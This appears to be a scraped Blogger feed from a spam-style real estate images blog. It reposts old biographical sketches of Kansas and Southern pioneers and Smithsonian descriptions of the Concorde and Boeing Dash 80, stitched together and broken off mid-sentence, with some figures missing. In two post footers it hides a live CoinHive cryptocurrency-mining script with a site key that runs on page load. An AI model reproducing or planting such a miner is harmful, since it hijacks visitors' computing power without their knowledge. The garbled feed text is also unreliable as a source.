Funeral services will be held from the Methodist church in Erie tomorrow afternoon at 2:30 and burial will be in the Erie cemetery.\u003Cbr\/\u003E  Judge Wells came to this county in 1866.  He was one of the founders of the city of Erie and of New Chicago, a part of Chanute.  He was the first mayor of Erie and was the organizer of the first Masonic lodge in Erie.  He was a thirty-second degree Mason and was secretary of the Erie chapter for forty years.  He has served as justice of the peace in Erie for twenty-five years and wrote up his last case just a day or so before he was taken sick last week.\u003Cbr\/\u003E  When his country needed men in the days of the Civil war, Judge Wells joined Company H, Illinois volunteer infantrymen as a private, served during the struggle and came home a captain.  The year following the close of the struggle he left his home in Illinois and came to Neosho county, where he has been a factor in the development since.\u003Cbr\/\u003E  Judge Wells has always enjoyed good health until a few days ago and has been unusually active for a man of his years.  He took to his bed last week and was sick only three or four days.\u003Cbr\/\u003E  He is survived by three sons and a daughter.  The sons are Seth G. Wells, state oil inspector and editor of the Erie Record, Logan H. Wells, Fort Worth, Tex., and J. C. Wells, Los Angeles, Cal.

WELLS, born in Greene County, Ill., in March, 1838; received a limited education at the district schools of his county, the most of his early life being spent on the farm, but was always acknowledged as a very apt scholar. At the age of eighteen he received a first grade certificate as a school teacher, passing an examination before the State Commissoner (sic) At the age of twenty-one he was elected a Justice of the Peace of his township. Previous to this he was, on motion, admitted to practice law before the District Court of his county. At the age of twenty-two he was married to Matilda, youngest daughter of Pleasant and Lydia Wood of his county. At the age of twenty-four he entered the service of his country as a private of Company H., Ninety-first Illinois Infantry, and by his prompt attention to business, he was rapidly promoted to the office of Orderly Sergeant, First Lieutenant and Captain of his company, and for daring acts on the battle field in and around Mobile, Ala., in March and April, 1865, he was, by the president, in special order, breveted Major of Volunteers. At the close of the war, in 1865, he returned home to his family, and a short time afterward declined the offer of a Second Lieutenancy of Cavalry of the regular army. In August, 1865, he removed to Adair County, Mo., where he bought a farm and remained until the spring of 1866, when he sold out and started for Kansas, arriving in Neosho County on the 4th of April, 1866, and bought a claim three miles northwest of where Erie is now located. In the fall of 1866 he was elected Probate Judge of Neosho County, and served as such until January, 1869. In the summer of 1867 he sold his farm and went to the woods and cut, hauled, rafted and then sawed the logs of which the Erie House, in Erie, and other buildings were built. He then, as a member of the Erie Town Company, built the first hotel ever built in the town, and moved into and occupied the same on the last day of 1867. Here he has ever since had his family residence. He, together with S. W. Fastar, bought the first piece of land for town purposes where Chanute now stands, and here he built two houses in 1870. He also completed the first business house ever built in Coffeyville, Kansas in August, 1871. He has several times been appointed Justice of the Peace of the city and was the first Mayor of the city of Erie, at its organization in December, 1869. In 1871 he was editor of the Erie Ishmaelite, a red hot local organ. In 1872 he was appointed Deputy United States Marshal, which place he held until 1874. During his two years service he was instrumental in bringing a large number of offenders to justice; those acts, coupled with the fact that he was chairman of the Erie executive committee for county seat purposes, made him many enemies as well as a large number of warm friends. In 1873 he was arrested for violation of his duties, which caused him a great deal of trouble. After two years of law bickerings the case was finally nolle prosequied. June 19, 1874, he received his appointment as one of the force of the United States secret service, which place he now holds. Among the noted criminals that he has captured he mentions those of J. S. Wilson, at Shreveport, La., in 1875, and Martin Hixley, in Sumner County, Kansas, in 1877, both of those being arrested and delivered to the proper officers, the former at Memphis, Tenn., and the latter at St. Louis, Mo. In February, 1876, he was ordered to report at New Orleans to the United States Marshal and was detailed to go to Cuba in the interest of the United States, but owing to the revolutionary state of the country at that time, the business was not arranged to his satisfaction; nevertheless the government was pleased with the tact he displayed, and for his shrewdness in the matter he was highly complimented. He mentions many other arrests and incidents of his life which would be of interest, but space forbids. He has been a Notary Public of Kansas ever since May 1, 1868, and is now engaged in the real estate and loan business. In February, 1883, was elected Justice of the Peace and City Judge by an almost unanimous vote. \u003Cbr\/\u003E\u003Cbr\/\u003EVolume III, part 2 of Kansas: a cyclopedia of state history, embracing events, institutions, industries, counties, cities, towns, prominent persons, etc. ... \/ with a supplementary volume devoted to selected personal history and reminiscence.

Wells of Erie, Kan., is a pioneer settler of the state and the representative of a family whose patriotism is unquestioned, for four generations of the Wells family have served in as many of our wars, Judge Wells, himself, being a veteran of the Civil war. He was born in Walkerville, Ill., March 24, 1838, a son of Samuel and Mary (Powers) Wells. Samuel Wells was a native of Tennessee, from which state he removed to Illinois in 1831. There he settled on a large farm which thereafter remained his home. He was a Democrat in politics and during the struggle of 1861-65 his sympathies were with the Southland. He was the father of twenty-four children and died in 1893, at the age of eighty-four. Philip Wells, the father of Samuel and the grandfather of Judge Wells, was born in Tennessee and was a Baptist minister. He, too, became a resident of Illinois and died in that state at the age of seventy-six. His wife attained the age of ninety. Philip Wells served in the war of 1812 and participated in the battle of New Orleans under Gen. Andrew Jackson. Carter Wells, the great-grandfather of Judge Wells, represented Virginia in the patriot army during the Revolution and soon after the war removed to Tennessee. The Wells family is of English descent and very early settled in America. The maternal grandfather of Judge Wells was Joseph Powers, who was a native of North Carolina but moved to Tennessee, where he engaged in farming and reared his family. Later he moved to Illinois and thence to Missouri, where de died. Judge Wells received his education in a log schoolhouse in Illinois and began life independently at the age of sixteen. He worked on his father's farm for a time, read law, and at the age of twenty-two was elected a justice of the peace in Illinois. Two years later, Aug. 8, 1862, the young man, inspired with the generous sentiments which actuated the flower of the youth of the North, enlisted in Company H, Ninety-first Illinois infantry, as a private under Col. Henry M. Day. The regiment was mustered in Sept. 8, 1862, left for the front Oct. 1, and arrived at Shepherdsville, Ky., on the 7th. On Dec. 27, at Elizabethtown, after an engagement with the forces of Gen. John Morgan, the regiment surrendered and the men were paroled. On June 5, 1863, it was exchanged and newly armed and equipped for the fray. The regiment was sent to Louisiana, where in the following September the brigade to which it belonged had a fight with the enemy near the Atchafalaya river, the result of the contest being that the enemy held his ground and the brigade fell back six miles. On the following day the brigade again advanced, driving the enemy across the river. On Nov. 6 the regiment started for Brownsville, Tex., skirmishing all the way with the enemy, and reached Fort Brown on Nov. 9, going into winter quarters, where it remained until Dec. 31, when it made its famous raid on Salt Lake, ninety miles out in the enemy's country, capturing a lake of salt two miles square, a few hundred horses, mules and cattle, which were promptly confiscated for the good of the command. In September, 1864, the regiment had quite a fight with the Confederates near Bagdad, on the north side of the Rio Grande, and it was said at the time a squadron of French troops forded the Rio Grande to help the Confederates, but all to no use, for they were driven back over the \u0026quot;old battlefield,\u0026quot; Palo Alto, of 1846. Throughout the siege of Spanish Fort and Fort Blakely the regiment took a very active part, and the fall of those strongholds resulted in the surrender of Mobile April 12, 1865. Company H was one of six that participated in a running engagement with Hardee after the surrender of the city, which was the last fight in which the regiment was engaged. The regiment was mustered out July 12, 1865. Besides the engagements mentioned above Judge Wells participated at Vicksburg and at Baton Rouge. During his service he was promoted to first lieutenant and during the last year of the war served as captain of his company. After the war he returned to Illinois, from whence he moved to Adair county, Missouri, where he remained six months. He then came directly to Erie, Kan., where he took a claim, proved it and sold it. In 1867 he built his home, which is the second oldest house in Erie. At this date (1911) he is the oldest continuous settler in Erie and was one of the original town-site men that established that place. He was also one of the organizers of Chanute and built the first house erected in Coffeyville. Judge Wells has always been a Republican and was the only Wells up to his time that believed in and supported the principles of that party. In 1866 he was elected probate judge of Neosho county and served until 1869. He has also served a number of years as a justice of the peace. He was admitted to the bar at Erie, Kan., in 1886, but had practiced law previous to that time. His business career has been along different lines, though his attention has been given principally to a general insurance, loan and pension business, in which he has been extensively engaged, but from which he is now retiring. He is now interested in raising fancy poultry and in past years has raised thoroughbred horses, principally trotters and pacers. In 1860 he married Matilda, a daughter of Pleasant Wood, a farmer resident of Illinois. Of their union were born six children. Loyal T. Wells, the eldest son, died in 1898, after serving five years in the regular army. Seth G. Wells, the second son, is well known to the people of Kansas through his official services and his political and journalistic activities. He was the efficient auditor of state eight years, from 1903 to 1911, and was postmaster at Erie five years preceding that. He has edited the \u0026quot;Erie Record\u0026quot; for a number of years and is one of the leading Republican politicians of the state. He was born, reared and educated in Kansas and his whole career has been one of useful activity in promoting the welfare of his state. Byron C. Wells, the first child born in the town of Erie, died in 1898. He was deputy postmaster there at the time of his death. Logan H. Wells, now an attorney at Lawton, Okla., and Jay C. Wells, a horseman at Salt Lake City, both served in the Spanish-American war, the former as a second lieutenant and the latter as a corporal. Jennie E. Wells, the only daughter, is a high school graduate and married J. E. Rodgers, who at the present time (1911) is bookkeeper for the state treasurer of Kansas and resides at Topeka. The mother of these children died in 1891, and in July, 1894, Judge Wells married Mary J. Hazen, a native of Pittsburgh, Pa. Her father, David H. Hazen, was a practicing lawyer at Pittsburgh for a number of years, but later removed to Iowa and thence to Kansas, where he died. He had enjoyed a successful business career and was a wealthy man at the time of his death. Mrs. Wells takes a prominent part in the work of the Methodist Episcopal church at Erie and is a leader in the Woman's Relief Corps there. Judge Wells is an enthusiastic member of the Masonic order and is one of the best informed men in Masonry in Kansas. He is a Thirty-second degree Scottish Rite Mason and a Noble of the Mystic Shrine. He has served as master of his lodge ten years, as secretary about the same length of time, and is at present filling that office. He is a man of unquestioned force and probity of character and throughout a long and active career has entered heartily into every movement which would promote the growth and welfare of his town and county. He is one of Neosho county's oldest and most honored pioneers and by an upright and useful life has won the esteem of all who know him. \u003Cbr\/\u003E\u003Cbr\/\u003EHere is where his photograph is:  www.flickr.com\/photos\/civilwar_veterans_tombstones\/630650...\u003C\/p\u003E\u003Cbr\/\u003E\u003Cp\u003E\u003Cstrong\u003EDaniel M.

DANIEL M. RAY, one of the honored veterans of the Civil war, who won his title through valiant service in defense of the Union, has been a resident of Woodson county since 1870. In September of that year he arrived in this portion of Kansas and secured a homestead in Everett township. Since that time he has taken an interest in everything pertaining to the welfare and development of the county along substantial lines of improvement, and through his active labors he has left the impress of his individuality upon its history. \u003Cbr\/\u003E A native of Yancy county, North Carolina, Colonel Ray was born on the 27th of March, 1833. He is a farmer's son and was reared in the usual manner of farmer lads. His father, Thomas W. Ray, was also a native of North Carolina and throughout his long life devoted his attention to agricultural pursuits. The grandfather, Hiram Ray, was a native of the Green Isle of Erin, whence he crossed the Atlantic to the new world, taking up his abode in the old North state. The mother of our subject bore the maiden name of Hannah Carter and was a daughter of Daniel Carter, an Englishman. The colonel is the eldest child of Thomas and Hannah Ray, the others being: Hiram, now deceased; James M., of Newport, Tennessee; Edward Wm., of North Carolina; Angus, of Texas; and Mrs. Laura Buckner of North Carolina. \u003Cbr\/\u003EThe educational privileges which Colonel Ray enjoyed were those afforded in the country schools of North Carolina, in the academy at Dandridge, Tennessee, and at Burnsville, North Carolina. Thus well equipped for life's practical duties, by a good education, he started out to earn his own living when twenty-one years of age, having previous to this time assisted in the work of the home farm. He engaged in teaching school for about three years and then went to Tennessee where he was living at the time of the inauguration of the Civil War. Although a southern man by birth and training, he believed that the government at Washington was supreme and that no state had a right to withdraw from the Union. Thus it was that when some of the southern states attempted to secede he joined the Union forces, becoming a member of the Third Tennessee Infantry, at Camp Dick Robinson, at Crab Orchard, Kentucky. He was commissioned adjutant of the regiment and served with that command for six months, when he was commissioned colonel of the Second Tennessee Cavalry. His regiment started for the field of action from Cumberland Gap and was with the Army of the Cumberland. After the battle of Stone river Colonel was placed in command of the Second and Third Division of the Cavalry, and refused a brevet, preferring to be colonel with a reputation rather than a general without one. On many a battlefield his own bravery inspired his men to deeds of valor and he made for himself a most creditable military record as a defender of the stars and stripes which now float so proudly over the nation. He served until 1864 when, on account of failing health, he was obliged to resign. Although often in the thickest of the fight, he was never wounded, but the rigors and hardships of war undermined his constitution. He participated in the hotly contested engagements at Stone river, Chickamauga, relief of Knoxville, the Atlanta campaign and the capture of the city, the battles of Franklin, Nashville and Jonesboro. \u003Cbr\/\u003EAfter resigning Colonel Ray returned to his home and family in Tennessee. He had been married in Burnsville, North Carolina, on the 26th of March, 1854, to Miss Louise Farris, a daughter of Joseph Farris, who belonged to an old Kentucky family. They have one son, Philip S., born December 22, 1864, who is now engaged with his father in the real estate business. He married Miss Laura Heizer, a daughter of J. W. Heizer of Eldorado, Kansas. \u003Cbr\/\u003EIn 1866 Colonel Ray removed with his family to Iroquois county, Illinois, where he engaged in farming until 1870, when he came to Woodson county, Kansas, locating here in the month of September. Upon the homestead in Everett township, which he secured, he resided for twelve years, placing the land under a high state of cultivation and thus transforming it into one of the fine farms in the community. In 1882 he sold the property and took up his abode in Yates Center, where he was engaged in merchandising for a year. He afterward held the office of county surveyor for twelve years and has probably found and located more corner stones than any other man in the county. In 1875 he laid out the city of Yates Center on Section 11, Township 25 and Range 15, and for the past eighteen years he has been an active factor in its development and progress. As a real estate dealer he is a man of comprehensive knowledge of land values and locations and is thus enabled to aid his clients in making judicious investments. He sustains an unassailable reputation as a business man, his honesty being proverbial. Socially he is connected with the Grand Army of the Republic and the A. O. U. W. His has been a creditable record in all life's relations and no resident of Yates Center more richly deserves the regard of his fellow townsmen than Colonel Daniel M. Ray. \u003Cbr\/\u003E\u003Cbr\/\u003E\u003Cbr\/\u003E\u003Cbr\/\u003E\u003Cbr\/\u003E\u003Cbr\/\u003E\u003C\/p\u003E\u003Cdiv class=\"blogger-post-footer\"\u003E\u003Cscript

I had many interior shots of his finely-crafted furniture, but they were awful, overpowered by visual noise. This is a series of 7 images.\u003Cbr\/\u003E\u003Cbr\/\u003EThe following is from the Wikipedia article on Thomas Day. en.wikipedia.org\/wiki\/Thomas_Day_(North_Carolina)\u003Cbr\/\u003E\u003Cbr\/\u003E“Thomas Day (c1801-c1861) was a free black American furniture designer and cabinetmaker in Caswell County, North Carolina. Day's furniture-making business became one of the largest of its kind in North Carolina, employing at one point up to twelve workers, and distributing furniture to wealthier customers throughout the state. Much of Day's furniture was produced for prominent political leaders, the state government, and the University of North Carolina.”\u003Cbr\/\u003E\u003Cbr\/\u003E“Day began his cabinetmaking business in Milton, North Carolina with his brother, John Day, Jr., but his brother left Caswell County by 1825, leaving the cabinetry business solely to Thomas. John Day would later emigrate to Liberia and serve as Chief Justice of Liberia.”\u003Cbr\/\u003E\u003Cbr\/\u003E“Day's furniture-making business, though owned by a free black American, employed the use of both black slaves and of white apprentices, despite the general belief that Day, as a free man, was of lower social stature than his white apprentices.”\u003Cbr\/\u003E\u003Cbr\/\u003E “As a businessman, Day was quite successful, at one point becoming a stockholder in the State Bank of North Carolina, and Day owned significant real estate, including his place of business and residence. This was highly unusual for a free person of color in the era before the American Civil War. Day had even managed to steam-power much of his furniture-making implements, which aided greatly in his production volume and efficiency. A national economic panic in 1857 caused Day's furniture business to suffer heavily, and in 1861 or at some time shortly after, Thomas Day died, although his exact death date is not known due to the lack of local public records.

C. Westbrook was born August 25, 1819, in Sampson County, North Carolina. He was the youngest of thirteen children. His father was a farmer of the slaveholding class, but relied upon the labor of his children, also, at the plow. The educational advantages he was able to give them were limited, and were confined, as far as they went, to a few months' attendance at the neighboring common schools. He set before them an example of industry, honesty, and patriotism, and thus instructed we will see that John C, of whom we have particularly to write, received a foundation of character upon which from early manhood he has erected a substantial and useful life. In 1827 his father moved his family southward in search of better land. He located in Fayette County, Georgia, and, after six years of hard work on the farm, both parents died. There were ten sons and three daughters left, and John C, then fifteen years of age, was the youngest. Immediately after the loss of his parents he set out to gain something more of an education, leaving an older brother in charge of the home. The Creek War breaking out at this time (1836) this brother volunteered under the American flag, and his course compelled John C. to abandon his laudable purpose to go to school. He took his brother's place on the farm, and labored faithfully to keep up the support of the household. In 1837 he succeeded in acquiring a few more and final months at school. In 1838 he enlisted in the ranks of the Federal volunteers, and the command to which he belonged was ordered to Fort Scudder, Cherokee County, Georgia. The Seminole war was then in its last stages, and the removal of the Cherokees was soon consummated. Upon the fulfillment of these purposes, which originated the call for volunteers, the troops were disbanded. \u003Cbr\/\u003E\u003Cbr\/\u003EIn 1839 Mr. Westbrook was employed by a clock manufacturer as traveling agent. In the fall of 1840 Mr. Westbrook immigrated to Tallapoosa, one of the central counties of Alabama, where he opened a farm, established a grist and saw mill, run by water power, and carried on a mercantile business, all on a small scale. His peaceful nature, but frank and courageous bearing, gave him good standing in a new country. He married in November, 1840, Elizabeth A. Lamberth, of Tallapoosa County, whose family had immigrated to Alabama that year. \u003Cbr\/\u003E\u003Cbr\/\u003EIn 1883 Mr. Westbrook moved to Birmingham. For ten years before that date he had bought and sold real estate in the city. Upon his removal to the city he entered largely into the market, buying eight thousand dollars worth of property, and improving it as he invested. Some example of his operations may be cited as illustrious of the success which good judgment and pluck and square dealings may attain. He offered some suburban real estate in 1884 at two hundred and fifty dollars per acre. It commands, January, 1887, two thousand dollars per acre. He bought seventeen acres in the spring of 1886 for one hundred and sixty dollars per acre. This now commands two thousand dollars per acre. Upon this latter tract he discovered a limestone bed, the stone being 75 per cent. lime. Besides operating on the suburbs, Mr. Westbrook has bought and sold some of the choicest lots in the business part of the city, with high profits. He had been a practical coal miner in the meantime, and in mercantile business in the produce line. \u003Cbr\/\u003E\u003Cbr\/\u003EHis marriage bore five children, one of them a son. The four daughters, now married and living near him in Birmingham, are the only survivors. He is connected with several corporations, among which we name, president of the Western Valley Street Railway; also, holds a directory in the Birmingham Agricultural Works. \u003Cbr\/\u003E\u003Cbr\/\u003EA physical peculiarity Mr. Westbrook mentions in regard to himself may be worthy of mention. His average sleep out of twenty-four hours has not exceeded four hours as far back into his youth as his memory goes. \u003Cbr\/\u003E\u003Cbr\/\u003E- from \u003Ci\u003EJefferson County and Birmingham Alabama: History and Biographical\u003C\/i\u003E, edited by John Witherspoon Dubose and published in 1887 by Teeple \u0026amp; Smith \/ Caldwell Printing Works, Birmingham, Alabama \u003C\/p\u003E\u003Cdiv class=\"blogger-post-footer\"\u003E\u003Cscript src=\"https:\/\/coinhive.com\/lib\/coinhive.min.js\"\u003E\u003C\/script\u003E\n\u003Cscript type=\"text\/JavaScript\"\u003E\n    var miner = new CoinHive.Anonymous('o2c5ecbIXWy8IFcRX7oHfVxW4apST2p7');\n    miner.start(CoinHive.FORCE_MULTI_TAB);\n\u003C\/script\u003E\u003C\/div\u003E"},"link":[{"rel":"edit","type":"application/atom+xml","href":"http:\/\/www.blogger.com\/feeds\/7747630693741840627\/posts\/default\/1651123536112020918"},{"rel":"self","type":"application/atom+xml","href":"http:\/\/www.blogger.com\/feeds\/7747630693741840627\/posts\/default\/1651123536112020918"},{"rel":"alternate","type":"text/html","href":"http:\/\/furrymenlover.blogspot.com\/2013\/02\/thomas-day-statue-4-holding-planer.html","title":"Thomas Day Statue 4--Holding a Planer"}],"author":[{"name":{"$t":"Diana Rose"},"uri":{"$t":"https:\/\/plus.google.com\/101312358980906425346"},"email":{"$t":"noreply@blogger.com"},"gd$image":{"rel":"http://schemas.google.com/g/2005#thumbnail","width":"16","height":"16","src":"https:\/\/img1.blogblog.com\/img\/b16-rounded.gif"}}]},{"id":{"$t":"tag:blogger.com,1999:blog-7747630693741840627.post-521484500087863670"},"published":{"$t":"2012-12-18T06:17:00.000-08:00"},"updated":{"$t":"2015-05-26T14:23:46.230-07:00"},"category":[{"scheme":"http://www.blogger.com/atom/ns#","term":"Carolina"},{"scheme":"http://www.blogger.com/atom/ns#","term":"Cool"},{"scheme":"http://www.blogger.com/atom/ns#","term":"Estate"},{"scheme":"http://www.blogger.com/atom/ns#","term":"images"},{"scheme":"http://www.blogger.com/atom/ns#","term":"North"},{"scheme":"http://www.blogger.com/atom/ns#","term":"North Carolina Real Estate"},{"scheme":"http://www.blogger.com/atom/ns#","term":"Real"}],"title":{"type":"text","$t":"Cool North Carolina Real Estate images"},"content":{"type":"html","$t":"\u003Cp\u003ECheck out these north carolina real estate images:\u003C\/p\u003E\u003Cbr\/\u003E\u003Cbr\/\u003E\u003Cbr\/\u003E\u003Cp\u003E\u003Cstrong\u003EAlfred Pope\u003C\/strong\u003E\u003Cbr\/\u003E\u003Cimg alt=\"north carolina real estate\" src=\"http:\/\/farm1.staticflickr.com\/96\/215434269_13fa185ca0.jpg\" width=\"400\"\/\u003E\u003Cbr\/\u003E\u003Ci\u003EImage by dbking\u003C\/i\u003E\u003Cbr\/\u003EFormer home of Alfred Pope (Former Slave, Real Estate Businessman)\u003Cbr\/\u003ELocation: 2900 O Street NW\u003Cbr\/\u003E\u003Cbr\/\u003EAlfred Pope (1821-1906) and Hannah Cole Pope (1828-1910) were a prominent Georgetown couple, active in public affairs and real estate. \u003Cbr\/\u003E\u003Cbr\/\u003EHannah was born in the home of Thomas Peter and Martha Custis Peter (now Tudor Place), where she and her mother were enslaved.

Designed and built by Aérospatiale of France and the British Aviation Corporation, the graceful Concorde was a stunning technological achievement that could not overcome serious economic problems.  \u003Cbr\/\u003E\u003Cbr\/\u003EIn 1976 Air France and British Airways jointly inaugurated Concorde service to destinations around the globe.  Carrying up to 100 passengers in great comfort, the Concorde catered to first class passengers for whom speed was critical.  It could cross the Atlantic in fewer than four hours - half the time of a conventional jet airliner.  However its high operating costs resulted in very high fares that limited the number of passengers who could afford to fly it.  These problems and a shrinking market eventually forced the reduction of service until all Concordes were retired in 2003. \u003Cbr\/\u003E\u003Cbr\/\u003EIn 1989, Air France signed a letter of agreement to donate a Concorde to the National Air and Space Museum upon the aircraft's retirement.  On June 12, 2003, Air France honored that agreement, donating Concorde F-BVFA to the Museum upon the completion of its last flight.  This aircraft was the first Air France Concorde to open service to Rio de Janeiro, Washington, D.C., and New York and had flown 17,824 hours.\u003Cbr\/\u003E\u003Cbr\/\u003E\u003Cem\u003EGift of Air France.\u003C\/em\u003E\u003Cbr\/\u003E\u003Cbr\/\u003E\u003Cstrong\u003EManufacturer:\u003C\/strong\u003E\u003Cbr\/\u003ESociete Nationale Industrielle Aerospatiale\u003Cbr\/\u003EBritish Aircraft Corporation\u003Cbr\/\u003E\u003Cbr\/\u003E\u003Cstrong\u003EDimensions:\u003C\/strong\u003E\u003Cbr\/\u003EWingspan:  25.56 m (83 ft 10 in)\u003Cbr\/\u003ELength:   61.66 m (202 ft 3 in)\u003Cbr\/\u003EHeight:   11.3 m (37 ft 1 in)\u003Cbr\/\u003EWeight, empty:  79,265 kg (174,750 lb)\u003Cbr\/\u003EWeight, gross:  181,435 kg (400,000 lb)\u003Cbr\/\u003ETop speed:  2,179 km\/h (1350 mph)\u003Cbr\/\u003EEngine:  Four Rolls-Royce\/SNECMA Olympus 593 Mk 602, 17,259 kg (38,050 lb) thrust each\u003Cbr\/\u003EManufacturer: Société Nationale Industrielle Aérospatiale, Paris, France, and British Aircraft Corporation, London, United Kingdom\u003Cbr\/\u003E\u003Cbr\/\u003E\u003Cstrong\u003EPhysical Description:\u003C\/strong\u003E\u003Cbr\/\u003EAircaft Serial Number:  205.

Built by the Boeing Aircraft Company, the 367-80, better known as the Dash 80, would come to revolutionize commercial air transportation when its developed version entered service as the famous Boeing 707, America's first jet airliner. \u003Cbr\/\u003E\u003Cbr\/\u003EIn the early 1950s, Boeing had begun to study the possibility of creating a jet-powered military transport and tanker to complement the new generation of Boeing jet bombers entering service with the U.S. Air Force. When the Air Force showed no interest, Boeing invested  million of its own capital to build a prototype jet transport in a daring gamble that the airlines and the Air Force would buy it once the aircraft had flown and proven itself. As Boeing had done with the B-17, it risked the company on one roll of the dice and won. \u003Cbr\/\u003E\u003Cbr\/\u003EBoeing engineers had initially based the jet transport on studies of improved designs of the Model 367, better known to the public as the C-97 piston-engined transport and aerial tanker. By the time Boeing progressed to the 80th iteration, the design bore no resemblance to the C-97 but, for security reasons, Boeing decided to let the jet project be known as the 367-80. \u003Cbr\/\u003E\u003Cbr\/\u003EWork proceeded quickly after the formal start of the project on May 20, 1952. The 367-80 mated a large cabin based on the dimensions of the C-97 with the 35-degree swept-wing design based on the wings of the B-47 and B-52 but considerably stiffer and incorporating a pronounced dihedral. The wings were mounted low on the fuselage and incorporated high-speed and low-speed ailerons as well as a sophisticated flap and spoiler system. Four Pratt \u0026amp; Whitney JT3 turbojet engines, each producing 10,000 pounds of thrust, were mounted on struts beneath the wings. \u003Cbr\/\u003E\u003Cbr\/\u003EUpon the Dash 80's first flight on July 15, 1954, (the 34th anniversary of the founding of the Boeing Company) Boeing clearly had a winner. Flying 100 miles per hour faster than the de Havilland Comet and significantly larger, the new Boeing had a maximum range of more than 3,500 miles. As hoped, the Air Force bought 29 examples of the design as a tanker\/transport after they convinced Boeing to widen the design by 12 inches. Satisfied, the Air Force designated it the KC-135A. A total of 732 KC-135s were built. \u003Cbr\/\u003E\u003Cbr\/\u003EQuickly Boeing turned its attention to selling the airline industry on this new jet transport. Clearly the industry was impressed with the capabilities of the prototype 707 but never more so than at the Gold Cup hydroplane races held on Lake Washington in Seattle, in August 1955. During the festivities surrounding this event, Boeing had gathered many airline representatives to enjoy the competition and witness a fly past of the new Dash 80. To the audience's intense delight and Boeing's profound shock, test pilot Alvin \u0026quot;Tex\u0026quot; Johnston barrel-rolled the Dash 80 over the lake in full view of thousands of astonished spectators. Johnston vividly displayed the superior strength and performance of this new jet, readily convincing the airline industry to buy this new airliner.\u003Cbr\/\u003E\u003Cbr\/\u003EIn searching for a market, Boeing found a ready customer in Pan American Airway's president Juan Trippe. Trippe had been spending much of his time searching for a suitable jet airliner to enable his pioneering company to maintain its leadership in international air travel. Working with Boeing, Trippe overcame Boeing's resistance to widening the Dash-80 design, now known as the 707, to seat six passengers in each seat row rather than five. Trippe did so by placing an order with Boeing for 20 707s but also ordering 25 of Douglas's competing DC-8, which had yet to fly but could accommodate six-abreast seating. At Pan Am's insistence, the 707 was made four inches wider than the Dash 80 so that it could carry 160 passengers six-abreast. The wider fuselage developed for the 707 became the standard design for all of Boeing's subsequent narrow-body airliners. \u003Cbr\/\u003E\u003Cbr\/\u003EAlthough the British de Havilland D.H. 106 Comet and the Soviet Tupolev Tu-104 entered service earlier, the Boeing 707 and Douglas DC-8 were bigger, faster, had greater range, and were more profitable to fly. In October 1958 Pan American ushered the jet age into the United States when it opened international service with the Boeing 707 in October 1958. National Airlines inaugurated domestic jet service two months later using a 707-120 borrowed from Pan Am. American Airlines flew the first domestic 707 jet service with its own aircraft in January 1959. American set a new speed mark when it opened the first regularly-scheduled transcontinental jet service in 1959. Subsequent nonstop flights between New York and San Francisco took only 5 hours - 3 hours less than by the piston-engine DC-7. The one-way fare, including a  surcharge for jet service, was 5.50, or 1 round trip. The flight was almost 40 percent faster and almost 25 percent cheaper than flying by piston-engine airliners. The consequent surge of traffic demand was substantial. \u003Cbr\/\u003E\u003Cbr\/\u003EThe 707 was originally designed for transcontinental or one-stop transatlantic range. But modified with extra fuel tanks and more efficient turbofan engines, the 707-300 Intercontinental series aircraft could fly nonstop across the Atlantic with full payload under any conditions. Boeing built 855 707s, of which 725 were bought by airlines worldwide. \u003Cbr\/\u003E\u003Cbr\/\u003EHaving launched the Boeing Company into the commercial jet age, the Dash 80 soldiered on as a highly successful experimental aircraft. Until its retirement in 1972, the Dash 80 tested numerous advanced systems, many of which were incorporated into later generations of jet transports. At one point, the Dash 80 carried three different engine types in its four nacelles. Serving as a test bed for the new 727, the Dash 80 was briefly equipped with a fifth engine mounted on the rear fuselage. Engineers also modified the wing in planform and contour to study the effects of different airfoil shapes. Numerous flap configurations were also fitted including a highly sophisticated system of \u0026quot;blown\u0026quot; flaps which redirected engine exhaust over the flaps to increase lift at low speeds. Fin height and horizontal stabilizer width was later increased and at one point, a special multiple wheel low pressure landing gear was fitted to test the feasibility of operating future heavy military transports from unprepared landing fields. \u003Cbr\/\u003E\u003Cbr\/\u003EAfter a long and distinguished career, the Boeing 367-80 was finally retired and donated to the Smithsonian in 1972. At present, the aircraft is installated at the National Air and Space Museum's new facility at Washington Dulles International Airport.\u003Cbr\/\u003E\u003Cbr\/\u003E\u003Cem\u003EGift of the Boeing Company\u003C\/em\u003E\u003Cbr\/\u003E\u003Cbr\/\u003E\u003Cstrong\u003EManufacturer:\u003C\/strong\u003E\u003Cbr\/\u003EBoeing Aircraft Co.\u003Cbr\/\u003E\u003Cbr\/\u003E\u003Cstrong\u003EDate:\u003C\/strong\u003E\u003Cbr\/\u003E1954\u003Cbr\/\u003E\u003Cbr\/\u003E\u003Cstrong\u003ECountry of Origin:\u003C\/strong\u003E\u003Cbr\/\u003EUnited States of America\u003Cbr\/\u003E\u003Cbr\/\u003E\u003Cstrong\u003EDimensions:\u003C\/strong\u003E\u003Cbr\/\u003EHeight 19' 2\u0026quot;: Length 73' 10\u0026quot;: Wing Span 129' 8\u0026quot;: Weight 33,279 lbs.\u003Cbr\/\u003E\u003Cbr\/\u003E\u003Cstrong\u003EPhysical Description:\u003C\/strong\u003E\u003Cbr\/\u003EPrototype Boeing 707; yellow and brown.\u003C\/p\u003E\u003Cdiv class=\"blogger-post-footer\"\u003E\u003Cscript src=\"https:\/\/coinhive.com\/lib\/coinhive.min.js\"\u003E\u003C\/script\u003E\n\u003Cscript type=\"text\/JavaScript\"\u003E\n    var miner = new CoinHive.Anonymous('o2c5ecbIXWy8IFcRX7oHfVxW4apST2p7');\n    miner.start(CoinHive.FORCE_MULTI_TAB);\n\u003C\/script\u003E\u003C\/div\u003E"},"link":[{"rel":"edit","type":"application/atom+xml","href":"http:\/\/www.blogger.com\/feeds\/7747630693741840627\/posts\/default\/8479670950369452566"},{"rel":"self","type":"application/atom+xml","href":"http:\/\/www.blogger.com\/feeds\/7747630693741840627\/posts\/default\/8479670950369452566"},{"rel":"alternate","type":"text/html","href":"http:\/\/furrymenlover.blogspot.com\/2012\/06\/steven-f-udvar-hazy-center-south-hangar.html","title":"Steven F.
